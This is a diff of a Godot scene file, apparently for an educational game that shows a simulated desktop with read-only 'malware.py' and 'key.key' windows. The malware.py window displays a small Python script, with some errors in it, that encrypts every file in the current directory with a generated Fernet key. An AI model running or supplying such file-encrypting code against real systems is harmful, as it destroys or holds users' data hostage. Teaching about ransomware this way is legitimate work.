@@ -56,9 +56,9 @@ icon = ExtResource("5_jebyr")
 [node name="Label" parent="Desktop/Text_icon" index="1"]
 text = "text.txt"
 
-[node name="Malware_icon" parent="Desktop" instance=ExtResource("2_ebhja")]
+[node name="Malware_icon" parent="Desktop" node_paths=PackedStringArray("window") instance=ExtResource("2_ebhja")]
 layout_mode = 2
-script = null
+window = NodePath("../../WindowContainer/MalwareWindow")
 
 [node name="Button" parent="Desktop/Malware_icon" index="0"]
 icon = ExtResource("6_2t71g")
@@ -66,8 +66,9 @@ icon = ExtResource("6_2t71g")
 [node name="Label" parent="Desktop/Malware_icon" index="1"]
 text = "malware.py"
 
-[node name="Key_icon" parent="Desktop" instance=ExtResource("2_ebhja")]
+[node name="Key_icon" parent="Desktop" node_paths=PackedStringArray("window") instance=ExtResource("2_ebhja")]
 layout_mode = 2
+window = NodePath("../../WindowContainer/KeyWindow")
 
 [node name="Button" parent="Desktop/Key_icon" index="0"]
 icon = ExtResource("6_2t71g")
@@ -179,12 +180,81 @@ metadata/_edit_use_anchors_ = true
 visible = false
 layout_mode = 2
 anchors_preset = 0
-anchor_right = 1.0
-anchor_bottom = 1.0
+anchor_left = 0.364791
+anchor_top = 0.167224
+anchor_right = 0.916515
+anchor_bottom = 0.714047
 offset_left = -25.0
 offset_top = -25.0
 offset_right = -25.0
 offset_bottom = -25.0
+
+[node name="Title" parent="WindowContainer/KeyWindow/HBoxContainer" index="0"]
+text = "key.key"
+
+[node name="CodeEdit" type="CodeEdit" parent="WindowContainer/KeyWindow"]
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+offset_left = 7.0
+offset_top = 32.0
+offset_right = -7.0
+offset_bottom = -7.0
+grow_horizontal = 2
+grow_vertical = 2
+theme_override_colors/background_color = Color(0, 0, 0, 0)
+theme_override_colors/font_readonly_color = Color(1, 1, 1, 1)
+editable = false
+
+[node name="MalwareWindow" parent="WindowContainer" instance=ExtResource("8_cclec")]
+visible = false
+layout_mode = 1
+anchor_left = 0.392015
+anchor_top = 0.262542
+anchor_right = 0.92196
+anchor_bottom = 0.884615
+
+[node name="Title" parent="WindowContainer/MalwareWindow/HBoxContainer" index="0"]
+text = "malware.py"
+
+[node name="CodeEdit" type="CodeEdit" parent="WindowContainer/MalwareWindow"]
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+offset_left = 7.0
+offset_top = 32.0
+offset_right = -7.0
+offset_bottom = -7.0
+grow_horizontal = 2
+grow_vertical = 2
+theme_override_colors/background_color = Color(0, 0, 0, 0)
+theme_override_colors/font_readonly_color = Color(1, 1, 1, 1)
+text = "import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"
+editable = false
 
 [node name="Label" type="Label" parent="WindowContainer"]
 layout_mode = 1
@@ -193,11 +263,13 @@ anchor_left = 0.0154265
 anchor_top = 0.958194
 anchor_right = 0.99637
 anchor_bottom = 1.01003
+offset_left = -0.000123978
+offset_top = -0.00201416
+offset_right = 0.00012207
 grow_horizontal = 2
 grow_vertical = 0
 theme_override_font_sizes/font_size = 22
 text = "Now the files have been encrypted. You can view the files or press next to proceed with programming."
-metadata/_edit_use_anchors_ = true
 
 [node name="Button" type="Button" parent="WindowContainer"]
 layout_mode = 1
@@ -224,3 +296,4 @@ text = "Next"
 [editable path="WindowContainer/SQLWindow"]
 [editable path="WindowContainer/TextWindow"]
 [editable path="WindowContainer/KeyWindow"]
+[editable path="WindowContainer/MalwareWindow"]
